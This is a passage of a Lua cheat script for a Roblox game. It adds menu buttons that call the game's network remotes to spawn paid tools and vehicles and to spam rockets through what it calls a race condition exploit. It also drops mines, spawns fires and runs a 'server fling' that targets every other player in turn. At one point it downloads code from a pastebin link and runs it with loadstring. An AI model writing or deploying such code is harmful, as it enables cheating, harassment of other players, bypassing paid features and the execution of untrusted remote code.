    outfitData.WidthScale = tonumber(WidthInput.Text) or 1
    outfitData.DepthScale = tonumber(DepthInput.Text) or 1
    outfitData.HeadScale = tonumber(HeadInput.Text) or 1
    outfitData.BodyTypeScale = tonumber(BodyTypeInput.Text) or 0

    local payload = buildBatchPayload(outfitData)
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)

    if not Send then
        ApplyScaleBtn.Text = "Loading Net..."
        pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))() end)
        task.wait(1)
        Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    end

    if Send then
        ApplyScaleBtn.Text = "Applying..."
        task.spawn(function()
            for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
            task.wait(0.2)
            
            if outfitData.SkinTone then 
                pcall(function() 
                    local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3]) 
                    for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end 
                end) 
            end
            
            for i=1,3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "DepthScale", outfitData.DepthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "HeadScale", outfitData.HeadScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.05) end
            if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.05) end end

            ApplyScaleBtn.Text = "Size Applied!"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
            task.wait(1.5)
            ApplyScaleBtn.Text = "Apply Sizes"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        end)
    else
        ApplyScaleBtn.Text = "Net Error"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        ApplyScaleBtn.Text = "Apply Sizes"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
    end
end)
------
-- -- ==============================================================
-- 🛠️ SMART PREMIUM TOOL SPAWNER (Hold for Options)
-- ==============================================================
local noCooldownEnabled = false
local isFiring = false

-- 1. Main Container
local ToolContainer = Instance.new("Frame")
ToolContainer.Size = UDim2.new(1, -5, 0, 40)
ToolContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ToolContainer.BorderSizePixel = 0
ToolContainer.ClipsDescendants = true
ToolContainer.Parent = ToolsScroll

-- 2. The Main Button (Tool Spawner Bar)
local ToolMainBtn = Instance.new("TextButton")
ToolMainBtn.Size = UDim2.new(1, 0, 0, 40)
ToolMainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
ToolMainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolMainBtn.Font = Enum.Font.SourceSansBold
ToolMainBtn.TextSize = 16
ToolMainBtn.Text = "🛠️ Tool Spawner (Hold for Options)"
ToolMainBtn.BorderSizePixel = 0
ToolMainBtn.Parent = ToolContainer
Instance.new("UICorner", ToolMainBtn).CornerRadius = UDim.new(0, 8)

-- 3. Tool Name Input Box
local ToolInput = Instance.new("TextBox")
ToolInput.Size = UDim2.new(1, -20, 0, 30)
ToolInput.Position = UDim2.new(0, 10, 0, 45)
ToolInput.PlaceholderText = "Type tool name (e.g. Jetpack, RocketLauncher)"
ToolInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
ToolInput.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolInput.Font = Enum.Font.SourceSansBold
ToolInput.TextSize = 13
ToolInput.Text = ""
ToolInput.ClearTextOnFocus = false
ToolInput.Parent = ToolContainer
Instance.new("UICorner", ToolInput).CornerRadius = UDim.new(0, 6)

-- 4. Get Tool Action Button
local SpawnToolBtn = Instance.new("TextButton")
SpawnToolBtn.Size = UDim2.new(1, -20, 0, 32)
SpawnToolBtn.Position = UDim2.new(0, 10, 0, 82)
SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
SpawnToolBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnToolBtn.Font = Enum.Font.SourceSansBold
SpawnToolBtn.TextSize = 14
SpawnToolBtn.Text = "Get Tool"
SpawnToolBtn.BorderSizePixel = 0
SpawnToolBtn.Parent = ToolContainer
Instance.new("UICorner", SpawnToolBtn).CornerRadius = UDim.new(0, 6)

-- 5. Rapid Fire Toggle Button
local NoCooldownBtn = Instance.new("TextButton")
NoCooldownBtn.Size = UDim2.new(1, -20, 0, 32)
NoCooldownBtn.Position = UDim2.new(0, 10, 0, 120) -- 1st Button
NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
NoCooldownBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoCooldownBtn.Font = Enum.Font.SourceSansBold
NoCooldownBtn.TextSize = 14
NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
NoCooldownBtn.BorderSizePixel = 0
NoCooldownBtn.Parent = ToolContainer
Instance.new("UICorner", NoCooldownBtn).CornerRadius = UDim.new(0, 6)


local ShotgunBtn = Instance.new("TextButton")
ShotgunBtn.Size = UDim2.new(1, -20, 0, 32)
ShotgunBtn.Position = UDim2.new(0, 10, 0, 160) 
ShotgunBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
ShotgunBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ShotgunBtn.Font = Enum.Font.SourceSansBold
ShotgunBtn.TextSize = 14
ShotgunBtn.Text = "💥 True Shotgun: OFF"
ShotgunBtn.BorderSizePixel = 0
ShotgunBtn.Parent = ToolContainer 
Instance.new("UICorner", ShotgunBtn).CornerRadius = UDim.new(0, 6)


-- 6. Explosive Trait Toggle Button 
local ExplosiveTraitBtn = Instance.new("TextButton")
ExplosiveTraitBtn.Size = UDim2.new(1, -20, 0, 32)
ExplosiveTraitBtn.Position = UDim2.new(0, 10, 0, 200) -- 3rd Button (Pushed down by 40)
ExplosiveTraitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
ExplosiveTraitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ExplosiveTraitBtn.Font = Enum.Font.SourceSansBold
ExplosiveTraitBtn.TextSize = 14
ExplosiveTraitBtn.Text = "💣 Explosive Trait: OFF"
ExplosiveTraitBtn.BorderSizePixel = 0
ExplosiveTraitBtn.Parent = ToolContainer
Instance.new("UICorner", ExplosiveTraitBtn).CornerRadius = UDim.new(0, 6)

-- ==========================================
-- TOOL SPAWN LOGIC
-- ==========================================
local knownTools = {
    "Jetpack", "RocketLauncher", "Parachute", "Segway", "Hoverboard", 
    "Glider", "BoomBox", "Sign", "Stroller", "Skateboard", "Flashlight", "Explosive"
}

SpawnToolBtn.MouseButton1Click:Connect(function()
    local inputName = string.lower(ToolInput.Text:gsub("%s+", ""))
    if inputName == "" then return end

    local foundName = nil
    for _, v in ipairs(knownTools) do
        if string.lower(v):find(inputName, 1, true) then
            foundName = v
            break
        end
    end

    local targetTool = foundName or ToolInput.Text
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if Send then
        Send("get_tool", targetTool)
        SpawnToolBtn.Text = "Received: " .. targetTool
        SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.delay(1.5, function()
            SpawnToolBtn.Text = "Get Tool"
            SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    end
end)

-- ==========================================
-- ⚡ MAX-SPEED RAPID FIRE (TRUE AUTO-EQUIP)
-- ==========================================
local isFiring = false

NoCooldownBtn.MouseButton1Click:Connect(function()
    noCooldownEnabled = not noCooldownEnabled
    
    if noCooldownEnabled then
        NoCooldownBtn.Text = "⚡ Rapid Fire: ON"
        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
    else
        NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        isFiring = false
    end
end)

local UserInputService = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed and input.UserInputType ~= Enum.UserInputType.Touch then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        -- We removed the 'hasLauncher' check. If it's enabled and you click, it just starts!
        if noCooldownEnabled and not isFiring then
            isFiring = true
            
            local char = player.Character
            local bp = player:FindFirstChild("Backpack")
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            
            -- Clear any old launchers out of your hands/inventory first
            if Send then Send("delete_tool") end
             if Send then Send("get_tool", "RocketLauncher") end
                 
            if char then
                for _, v in ipairs(char:GetChildren()) do
                    if v:IsA("Tool") and v.Name == "RocketLauncher" then v:Destroy() end
                end
            end
            if bp then
                for _, v in ipairs(bp:GetChildren()) do
                    if v.Name == "RocketLauncher" then v:Destroy() end
                end
            end
            
            -- MAX SPEED LOOP
            task.spawn(function()
                while isFiring and noCooldownEnabled do
                    -- Refresh variables inside the loop so it doesn't break if you respawn
                    local currentChar = player.Character
                    local currentBp = player:FindFirstChild("Backpack")
                    
                    if not currentChar or not currentBp then break end
                    
                    -- 1. Ask the server for a fresh launcher automatically
                    if Send then Send("get_tool", "RocketLauncher") end
                    
                    -- 2. Wait just long enough for it to appear based on ping
                    local newLauncher = currentBp:WaitForChild("RocketLauncher", 0.15)
                    
                    if newLauncher then
                        -- 3. Equip instantly
                        newLauncher.Parent = currentChar
                        
                        -- 4. Calculate exact aim
                        local handle = newLauncher:FindFirstChild("Handle")
                        local spawnPos = handle and handle.Position or (currentChar:GetPivot().Position + Vector3.new(0, 2, 0))
                        local targetCFrame = CFrame.new(spawnPos, mouse.Hit.Position)
                        
                        -- 5. Shoot and immediately delete!
                        if Send then Send("shoot_rocket", newLauncher, targetCFrame) end
                        if Send then Send("delete_tool") end
                        newLauncher:Destroy()
                    end
                    
                    -- Using the absolute minimum yield time to prevent crashing
                    task.wait() 
                end
                
                -- When you let go of the mouse, restock your inventory safely
                if Send and noCooldownEnabled then 
                    Send("get_tool", "RocketLauncher") 
                end
            end)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isFiring = false
    end
end)
-- ==========================================
-- 💥 TRUE SHOTGUN (RACE CONDITION EXPLOIT)
-- ==========================================
local isShotgunActive = false

ShotgunBtn.MouseButton1Click:Connect(function()
    isShotgunActive = not isShotgunActive
    if isShotgunActive then
        ShotgunBtn.Text = "💥 True Shotgun: ON"
        ShotgunBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 20) 
        
        -- 🛑 ANTI-CONFLICT: Turn off Rapid Fire
        if noCooldownEnabled then
            noCooldownEnabled = false
            NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
            NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        end
    else
        ShotgunBtn.Text = "💥 True Shotgun: OFF"
        ShotgunBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
    end
end)

local UserInputService = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed and input.UserInputType ~= Enum.UserInputType.Touch then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if isShotgunActive then
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            local char = player.Character
            local bp = player:FindFirstChild("Backpack")
            
            if Send and char and bp then
                -- Clear hands to prevent bugs
                Send("delete_tool")
                
                -- 1. Get ONE real weapon
                Send("get_tool", "RocketLauncher")
                local newLauncher = bp:WaitForChild("RocketLauncher", 0.15)
                
                if newLauncher then
                    newLauncher.Parent = char
                    local baseOrigin = mouse.Origin
                    
                    -- 2. THE RACE CONDITION: Spam the remote 5 times in 1 millisecond on the SAME gun
                    for i = 1, 50 do
                        -- Add spread so they don't perfectly overlap and look like 1 rocket
                        local spreadX = math.random(-15, 15) / 100
                        local spreadY = math.random(-15, 15) / 100
                        local spreadCFrame = baseOrigin * CFrame.Angles(spreadX, spreadY, 0)
                        
                        Send("shoot_rocket", newLauncher, spreadCFrame)
                    end
                    
                    -- 3. Delete immediately after the burst hits the network
                    Send("delete_tool")
                    newLauncher:Destroy()
                end
            end
        end
    end
end)


-- ==========================================
-- 💣 EXPLOSIVE TRAIT (WALKING MINE DROPPER)
-- ==========================================
local explosiveTraitEnabled = false
local explosiveTraitLoop = nil
local lastMinePos = Vector3.new(0, 0, 0)

ExplosiveTraitBtn.MouseButton1Click:Connect(function()
    explosiveTraitEnabled = not explosiveTraitEnabled
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if explosiveTraitEnabled then
        ExplosiveTraitBtn.Text = "💣 Explosive Trait: ON"
        ExplosiveTraitBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50) -- Explosive Orange!
        
        -- Automatically request the Explosive tool from the server
        if Send then Send("get_tool", "Explosive") end
        
        explosiveTraitLoop = game:GetService("RunService").Heartbeat:Connect(function()
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            
            -- Only run if you actually have the explosive equipped in your hand!
            local currentTool = char and char:FindFirstChildOfClass("Tool")
            if currentTool and currentTool.Name == "Explosive" and root then
                
                local currentPos = root.Position
                -- Check if we have walked at least 6 studs away from the last dropped mine
                if (currentPos - lastMinePos).Magnitude > 6 then
                    lastMinePos = currentPos
                    
                    -- Drop the explosive right at your feet!
                    -- (Vector3.new(0,1,0) is the "Y-axis normal" telling the server it's placed on the ground)
                    local dropPos = currentPos - Vector3.new(0, 2.5, 0) 
                    
                   if Send then
    -- 1. Drop the mine
    Send("place", dropPos, Vector3.new(0, 1, 0))
    
    -- 2. Ask the server for a new one immediately
    Send("get_tool", "Explosive")
    
    -- 3. Auto-equip it so the loop doesn't break
    task.spawn(function()
        local bp = player:FindFirstChild("Backpack")
        local newExp = bp and bp:WaitForChild("Explosive", 1)
        if newExp and char then newExp.Parent = char end
  end)
                    end
                end -- <--- This 'end' closes the Magnitude distance check
                
            end -- <--- This 'end' closes the currentTool check
        end)
    else
        ExplosiveTraitBtn.Text = "💣 Explosive Trait: OFF"
        ExplosiveTraitBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        
        if explosiveTraitLoop then
            explosiveTraitLoop:Disconnect()
            explosiveTraitLoop = nil
        end
    end
end)

-- ==========================================
-- SMART HOLD CONNECTION
-- ==========================================
applySmartHold(
    ToolMainBtn,    
    ToolContainer,  
    40,             
    250,            -- Increased height to 200px to perfectly fit the new Explosive button
    0.5,              
    function()
        if ToolInput.Text ~= "" then
            for _, conn in ipairs(getconnections(SpawnToolBtn.MouseButton1Click)) do
                conn.Function()
            end
        end
    end,
    function(isExpanded)
        if isExpanded then
            ToolMainBtn.Text = "🛠️ Premium Tool Spawner [▲ Options]"
        else
            ToolMainBtn.Text = "🛠️ Premium Tool Spawner (Hold for Options)"
        end
    end
)
-- ==============================================================
-- 🚙 SMART VEHICLE SPAWNER & TANK CARPET BOMBER (Hold for Options)
-- ==============================================================
-- 1. Main Container
local VehContainer = Instance.new("Frame")
VehContainer.Size = UDim2.new(1, -5, 0, 40)
VehContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
VehContainer.BorderSizePixel = 0
VehContainer.ClipsDescendants = true
VehContainer.Parent = ToolsScroll

-- 2. The Main Button (Vehicle Spawner Bar)
local VehMainBtn = Instance.new("TextButton")
VehMainBtn.Size = UDim2.new(1, 0, 0, 40)
VehMainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
VehMainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
VehMainBtn.Font = Enum.Font.SourceSansBold
VehMainBtn.TextSize = 16
VehMainBtn.Text = "🚙 Vehicle Spawner (Hold for Options)"
VehMainBtn.BorderSizePixel = 0
VehMainBtn.Parent = VehContainer
Instance.new("UICorner", VehMainBtn).CornerRadius = UDim.new(0, 8)

-- 3. Vehicle Name Input Box
local VehInput = Instance.new("TextBox")
VehInput.Size = UDim2.new(1, -20, 0, 30)
VehInput.Position = UDim2.new(0, 10, 0, 45)
VehInput.PlaceholderText = "Type car name (e.g. Tank, Monster Truck)"
VehInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
VehInput.TextColor3 = Color3.fromRGB(255, 255, 255)
VehInput.Font = Enum.Font.SourceSansBold
VehInput.TextSize = 13
VehInput.Text = ""
VehInput.ClearTextOnFocus = false
VehInput.Parent = VehContainer
Instance.new("UICorner", VehInput).CornerRadius = UDim.new(0, 6)

-- 4. Spawn Vehicle Action Button
local SpawnVehBtn = Instance.new("TextButton")
SpawnVehBtn.Size = UDim2.new(1, -20, 0, 32)
SpawnVehBtn.Position = UDim2.new(0, 10, 0, 82)
SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
SpawnVehBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnVehBtn.Font = Enum.Font.SourceSansBold
SpawnVehBtn.TextSize = 14
SpawnVehBtn.Text = "Spawn Vehicle"
SpawnVehBtn.BorderSizePixel = 0
SpawnVehBtn.Parent = VehContainer
Instance.new("UICorner", SpawnVehBtn).CornerRadius = UDim.new(0, 6)


-- ==========================================
-- VEHICLE SPAWN LOGIC
-- ==========================================
local flamesHubCars = {
    "Magic Carpet", "EClass", "TowTruck", "Bicycle", "Fiat500", "Cayenne", "Jetski", "LuggageScooter",
    "MiniCooper", "GarbageTruck", "EScooter", "Monster Truck", "Yacht", "Stingray", "FireTruck", "VespaPizza",
    "VespaPolice", "F150", "Police SUV", "Chiron", "Humvee", "Wrangler", "Box Van", "Ambulance", "Urus", "Tesla",
    "Cybertruck", "RollsRoyce", "GClass", "SVJ", "MX5", "SF90", "Charger SRT", "Evoque", "IceCream Truck",
    "Vespa", "ATV", "Limo", "Tank", "Smart Car", "Beauford", "SchoolBus", "Sprinter", "GolfKart", "TrackHawk",
    "Helicopter", "SnowPlow", "Camper Van", "SWAT Van"
}

SpawnVehBtn.MouseButton1Click:Connect(function()
    local inputName = string.lower(VehInput.Text:gsub("%s+", ""))
    if inputName == "" then return end

    local foundName = nil
    for _, v in ipairs(flamesHubCars) do
        if string.lower(v:gsub("%s+", "")):find(inputName, 1, true) then
            foundName = v
            break
        end
    end

    local targetVeh = foundName or VehInput.Text 
    local Get = getgenv().Get or (getgenv().g and getgenv().g.Get)
    
    if Get then
        Get("spawn_vehicle", targetVeh)
        SpawnVehBtn.Text = "Spawned: " .. targetVeh
        SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.delay(1.5, function()
            SpawnVehBtn.Text = "Spawn Vehicle"
            SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    else
        SpawnVehBtn.Text = "Network Error"
        SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.delay(1.5, function()
            SpawnVehBtn.Text = "Spawn Vehicle"
            SpawnVehBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    end
end)

-- ==========================================
-- SMART HOLD CONNECTION
-- ==========================================
applySmartHold(
    VehMainBtn,    
    VehContainer,  
    40,             
    165,            -- Expands to 165px to fit the Input, Spawn Btn, and Carpet Bomb Btn
    0.5,              
    function()
        if VehInput.Text ~= "" then
            for _, conn in ipairs(getconnections(SpawnVehBtn.MouseButton1Click)) do
                conn.Function()
            end
        end
    end,
    function(isExpanded)
        if isExpanded then
            VehMainBtn.Text = "🚙 Premium Vehicle Spawner [▲ Options]"
        else
            VehMainBtn.Text = "🚙 Premium Vehicle Spawner (Hold for Options)"
        end
    end
)


-- ========== FE FIRE SPAWNER (Bypassed Premium) ==========
local FireSpawnFrame = Instance.new("Frame")
FireSpawnFrame.Size = UDim2.new(1, -5, 0, 30) -- Starts collapsed
FireSpawnFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
FireSpawnFrame.BorderSizePixel = 0
FireSpawnFrame.ClipsDescendants = true
FireSpawnFrame.Parent = ToolsScroll

local FireToggleBtn = Instance.new("TextButton")
FireToggleBtn.Size = UDim2.new(1, 0, 0, 30)
FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▼ ]"
FireToggleBtn.TextColor3 = Color3.fromRGB(255, 100, 50)
FireToggleBtn.Font = Enum.Font.SourceSansBold
FireToggleBtn.TextSize = 14
FireToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
FireToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
FireToggleBtn.BorderSizePixel = 0
FireToggleBtn.Parent = FireSpawnFrame

local FireContent = Instance.new("Frame")
FireContent.Size = UDim2.new(1, 0, 1, -30)
FireContent.Position = UDim2.new(0, 0, 0, 30)
FireContent.BackgroundTransparency = 1
FireContent.Visible = false
FireContent.Parent = FireSpawnFrame

local FireInput = Instance.new("TextBox")
FireInput.Size = UDim2.new(1, -20, 0, 30)
FireInput.Position = UDim2.new(0, 10, 0, 10)
FireInput.PlaceholderText = "Enter amount (e.g. 5 or 20)"
FireInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
FireInput.TextColor3 = Color3.fromRGB(255, 255, 255)
FireInput.Font = Enum.Font.SourceSansBold
FireInput.TextSize = 14
FireInput.Text = "5"
FireInput.ClearTextOnFocus = false
FireInput.Parent = FireContent
Instance.new("UICorner", FireInput).CornerRadius = UDim.new(0, 6)

local SpawnFireBtn = Instance.new("TextButton")
SpawnFireBtn.Size = UDim2.new(1, -20, 0, 35)
SpawnFireBtn.Position = UDim2.new(0, 10, 0, 50)
SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
SpawnFireBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnFireBtn.Font = Enum.Font.SourceSansBold
SpawnFireBtn.TextSize = 14
SpawnFireBtn.Text = "Spawn Fire"
SpawnFireBtn.BorderSizePixel = 0
SpawnFireBtn.Parent = FireContent
Instance.new("UICorner", SpawnFireBtn).CornerRadius = UDim.new(0, 6)

-- Dropdown Toggle Logic
local fireExpanded = false
FireToggleBtn.MouseButton1Click:Connect(function()
    fireExpanded = not fireExpanded
    if fireExpanded then
        FireSpawnFrame.Size = UDim2.new(1, -5, 0, 100)
        FireContent.Visible = true
        FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▲ ]"
    else
        FireSpawnFrame.Size = UDim2.new(1, -5, 0, 30)
        FireContent.Visible = false
        FireToggleBtn.Text = "  🔥 FE Fire Spawner [ ▼ ]"
    end
end)
-- The Bypassed Spawner Logic (Exact Original Mimic)
SpawnFireBtn.MouseButton1Click:Connect(function()
    local amount = tonumber(FireInput.Text) or 5 
    
    -- Find the global network functions
    local g = getgenv().g or getgenv()
    local Send = g.Send

    if Send then
        SpawnFireBtn.Text = "Spawning " .. amount .. " Fires..."
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
        
        task.spawn(function()
            -- 1. Mimic the hub's exact pre-fire wait (fw(0.2))
            task.wait(0.2)
            
            -- 2. Attempt to run the hub's specific amount setter if it exists
            pcall(function()
                if type(g.set_fire_amount_FE) == "function" then
                    g.set_fire_amount_FE(amount)
                elseif type(getgenv().set_fire_amount_FE) == "function" then
                    getgenv().set_fire_amount_FE(amount)
                end
            end)
            
            -- 3. Fire all requests instantly on the same frame (No task.wait inside the loop!)
            for i = 1, amount do
                Send("request_fire")
            end
            
            SpawnFireBtn.Text = "Fires Spawned!"
            SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            task.wait(1.5)
            SpawnFireBtn.Text = "Spawn Fire"
            SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
        end)
    else
        SpawnFireBtn.Text = "Network Error"
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        SpawnFireBtn.Text = "Spawn Fire"
        SpawnFireBtn.BackgroundColor3 = Color3.fromRGB(200, 80, 40)
    end
end)


-- ========== MASS SERVER FLING (Underground Uppercut + Auto-Respawn & Stack Logs) ==========
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local isMassFlinging = false
local massFlingLoop = nil
local targetCycler = nil
local massFlingTarget = nil
local massWhitelist = {}
local originalCarProps = {}

-- Main Container (Adjusted to fit Status Console)
local MassFlingFrame = Instance.new("Frame")
MassFlingFrame.Size = UDim2.new(1, -5, 0, 165)
MassFlingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
MassFlingFrame.BorderSizePixel = 0
MassFlingFrame.ClipsDescendants = true
MassFlingFrame.Parent = ToolsScroll

local MassFlingTitle = Instance.new("TextLabel")
MassFlingTitle.Size = UDim2.new(1, -10, 0, 20)
MassFlingTitle.Position = UDim2.new(0, 5, 0, 5)
MassFlingTitle.Text = "🚗 Autonomous Server Strike"
MassFlingTitle.TextColor3 = Color3.fromRGB(0, 255, 200)
MassFlingTitle.Font = Enum.Font.SourceSansBold
MassFlingTitle.TextSize = 14
MassFlingTitle.TextXAlignment = Enum.TextXAlignment.Left
MassFlingTitle.BackgroundTransparency = 1
MassFlingTitle.Parent = MassFlingFrame

local MassFlingBtn = Instance.new("TextButton")
MassFlingBtn.Size = UDim2.new(1, -10, 0, 35)
MassFlingBtn.Position = UDim2.new(0, 5, 0, 25)
MassFlingBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
MassFlingBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MassFlingBtn.Font = Enum.Font.SourceSansBold
MassFlingBtn.TextSize = 16
MassFlingBtn.Text = "START SERVER FLING"
MassFlingBtn.BorderSizePixel = 0
MassFlingBtn.Parent = MassFlingFrame

-- Stacking Status Log Console
local StatusScroll = Instance.new("ScrollingFrame")
StatusScroll.Size = UDim2.new(1, -10, 0, 60)
StatusScroll.Position = UDim2.new(0, 5, 0, 65)
StatusScroll.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
StatusScroll.BorderSizePixel = 0
StatusScroll.ScrollBarThickness = 3
StatusScroll.Parent = MassFlingFrame

local StatusLayout = Instance.new("UIListLayout")
StatusLayout.SortOrder = Enum.SortOrder.LayoutOrder
StatusLayout.Padding = UDim.new(0, 2)
StatusLayout.Parent = StatusScroll

StatusLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    StatusScroll.CanvasSize = UDim2.new(0, 0, 0, StatusLayout.AbsoluteContentSize.Y)
    StatusScroll.CanvasPosition = Vector2.new(0, StatusLayout.AbsoluteContentSize.Y) -- Auto-scroll down
end)

local statusOrder = 0
local function updateStatus(text, color, clearLogs)
    if clearLogs then
        for _, child in ipairs(StatusScroll:GetChildren()) do
            if child:IsA("TextLabel") then child:Destroy() end
        end
        statusOrder = 0
    end
    
    local msg = Instance.new("TextLabel")
    msg.Size = UDim2.new(1, -5, 0, 15)
    msg.BackgroundTransparency = 1
    msg.Text = " " .. text
    msg.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    msg.Font = Enum.Font.Code
    msg.TextSize = 11
    msg.TextXAlignment = Enum.TextXAlignment.Left
    msg.LayoutOrder = statusOrder
    msg.Parent = StatusScroll
    
    statusOrder = statusOrder + 1
end



local function getMyVehicle()
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")
    if not vehiclesFolder then return nil end
    for _, v in pairs(vehiclesFolder:GetChildren()) do
        local ownerObj = v:FindFirstChild("owner") or v:FindFirstChild("owner", true)
        if ownerObj and ownerObj.Value == LocalPlayer then return v end
    end
    return nil
end

local function stopMassFling()
    isMassFlinging = false
    massFlingTarget = nil
    updateStatus("🛑 Attack sequence stopped.", Color3.fromRGB(200, 50, 50), false)
    
    if massFlingLoop then massFlingLoop:Disconnect(); massFlingLoop = nil end
    if targetCycler then task.cancel(targetCycler); targetCycler = nil end
    
    -- Restore original physics
    for part, props in pairs(originalCarProps) do
        if part and part.Parent then part.CustomPhysicalProperties = props end
    end
    table.clear(originalCarProps)
    
    local car = getMyVehicle()
    if car then
        local base = car.PrimaryPart or car:FindFirstChild("Base")
        if base then
            base.Velocity = Vector3.zero
            base.RotVelocity = Vector3.zero
        end
    end
end

local function startMassFling()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum or not hum.SeatPart then return false end 
    
    local car = getMyVehicle()
    local base = car and (car.PrimaryPart or car:FindFirstChild("Base") or hum.SeatPart)
    if not base then return false end
    
    local lastVehicleName = car.Name

    isMassFlinging = true
    local isRespawningVehicle = false
    table.clear(originalCarProps)

    -- Force max density
    for _, part in ipairs(car:GetDescendants()) do
        if part:IsA("BasePart") then
            originalCarProps[part] = part.CustomPhysicalProperties
            part.CustomPhysicalProperties = PhysicalProperties.new(100, 0, 0, 100, 100)
            part.CanCollide = true
        end
    end
    
    local vehiclesFolder = workspace:FindFirstChild("Vehicles")

    -- 1. LOOPING CYCLER (Fast & Checks every user)
    targetCycler = task.spawn(function()
        while isMassFlinging do
            local playerList = Players:GetPlayers()
            -- Automatically clears logs on every new sweep
            updateStatus("🔄 Sweeping Server (" .. #playerList .. " players)...", Color3.fromRGB(100, 150, 255), true)
            
            for _, plr in ipairs(playerList) do
                if not isMassFlinging then break end
                if plr == LocalPlayer or massWhitelist[plr.Name] then continue end
                
                -- Wait if car is currently respawning
                while isRespawningVehicle do task.wait(0.2) end
                
